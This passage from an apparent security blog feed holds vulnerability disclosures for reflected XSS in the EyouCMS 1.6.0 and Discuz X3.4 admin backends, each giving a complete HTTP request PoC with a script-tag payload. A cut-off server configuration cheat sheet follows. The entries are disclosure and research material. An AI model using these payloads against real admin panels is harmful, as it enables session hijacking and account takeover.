        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article publish with reflected-XSS in the cookie <code>ENV_GOBACK_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201615717-be81fb04-1140-4e59-b83b-16244cab3fc8.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/35">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45538">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45541)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article attribute type changing with reflected-XSS in the POST value <code>value</code> when the value contains non-integer char, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Index&amp;a=changeTableVal&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=ArchivesFlag&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex; ENV_IS_UPHTML=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"></span><br><span class="line"><span class="language-sas">value=<span class="title function_">%BA0</span>&lt;script&gt;alert(1)&lt;/script&gt;<span class="variable">&amp;field</span>=status<span class="variable">&amp;id_value</span>=1<span class="variable">&amp;id_name</span>=id<span class="variable">&amp;table</span>=archives_flag</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201617314-9974739a-12ef-4da5-9bbc-dc252941a50c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/36">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45541">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45540)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article type adding with reflected-XSS in the post value <code>name</code> when the value contains malformed UTF-8 chars, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"></span><br><span class="line"><span class="language-sas">channel_id=-99<span class="variable">&amp;remark</span>=af<span class="variable">&amp;dfvalue</span>=<span class="variable">&amp;dtype</span>=text<span class="variable">&amp;name</span>=&lt;script&gt;alert(1)&lt;/script&gt;<span class="title function_">%C0aef</span><span class="variable">&amp;title</span>=aef</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201618239-d45d61ad-ed2c-446c-b236-badcf8c8145c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/37">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45540">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)</title>
      <link href="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/"/>
      <url>/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file adding with reflected-XSS in the GET value <code>activepath</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201619455-f28827d5-5826-4241-8fcd-9a7a8821f0d9.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/38">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45539">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz X3.4 Backend Reflected XSS (CVE-2022-45543)</title>
      <link href="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/"/>
      <url>/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend audit search of content audit component with reflected-XSS in POST value <code>dateline</code>, <code>title</code>, <code>tpp</code> and <code>username</code>, which bypassed discuz security check and even could hijack callback url link, and it can also inject javascript to setTimeout at the end of html response.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DiscuzX &lt;= 3.4, SC_UTF8_20221111</p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/da3b14b2_12015184.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.4</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.4/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>5Kkn_2132_saltkey=y03s5T45; 5Kkn_2132_lastvisit=1668496347; 5Kkn_2132_ulastactivity=07108qps3b3FkXEEZNxrT%2BtyQpXYN9%2FSOodQCNbMLoO%2BO6DOk8pF; 5Kkn_2132_auth=7791L55DZFdkAgcM5rDcnjIiVH0t%2BptlGCIqLkAhUIRMsUDTnq%2BGi7atBCt%2BPdyl2mCVv0hA3jA%2BxaOfDB1h; 5Kkn_2132_lastcheckfeed=1%7C1668501456; 5Kkn_2132_nofavfid=1; 5Kkn_2132_sid=yhpz44; 5Kkn_2132_lip=172.17.0.1%2C1668502019; 5Kkn_2132_lastact=1668502045%09admin.php%09</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">formhash</span><span class="operator">=</span><span class="number">288</span>a0c1d<span class="variable">&amp;scrolltop</span>=<span class="variable">&amp;anchor</span>=<span class="variable">&amp;username</span>=aa<span class="variable">&amp;title</span>=aa<span class="variable">&amp;tpp</span>=<span class="number">20</span><span class="variable">&amp;filter</span>=normal<span class="variable">&amp;modfid</span>=all<span class="variable">&amp;dateline</span>=<span class="number">604</span><span class="string">&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&amp;modsubmit=%E6%8F%90%E4%BA%A4</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/a98c544f_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/c20f32f9_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/d35d3b7c_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/0d4be145_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/b518294b_12015184.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gitee.com/Discuz/DiscuzX/issues/I61CR2">Gitee Issue</a> (Login Required)</li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45543">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vulnerability </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CVE </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Server Environment Configuration CheatSheet</title>
      <link href="/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/"/>
      <url>/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="Basic-Environment"><a href="#Basic-Environment" class="headerlink" title="Basic Environment"></a>Basic Environment</h1><p> 基础环境配置，安装常用 shell 工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line">sudo apt-get install -y zsh vim curl wget cloc unzip zip graphviz tree build-essential make cmake git openssh-server netcat net-tools tmux</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt; ~/.tmux.conf</span><br></pre></td></tr></table></figure><h2 id="ZSH"><a href="#ZSH" class="headerlink" title="ZSH"></a>ZSH</h2><p> 安装 zsh，更换默认 shell 为 oh-my-zsh，同时安装语法高亮与自动补全插件，并且更换 zsh 的主题为 bira。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span><br><span class="line">sed -i <span class="string">&#x27;s/ZSH_THEME=&quot;robbyrussell&quot;/ZSH_THEME=&quot;bira&quot;/g&#x27;</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="V2ray"><a href="#V2ray" class="headerlink" title="V2ray"></a>V2ray</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)</span><br><span class="line">sudo vim /usr/local/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h1><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y apache2</span><br></pre></td></tr></table></figure><h3 id="Apache2-Configuration"><a href="#Apache2-Configuration" class="headerlink" title="Apache2 Configuration"></a>Apache2 Configuration</h3><p> 修改 Apache2 mpm-prefork 模式的并发数量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/StartServers\s+\d+/StartServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MinSpareServers\s+\d+/MinSpareServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxSpareServers\s+\d+/MaxSpareServers 30/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxClients\s+\d+/MaxClients 500/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxRequestsPerChild\s+\d+/MaxRequestsPerChild 10000/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;11a\\\tServerLimit 500&quot;</span> 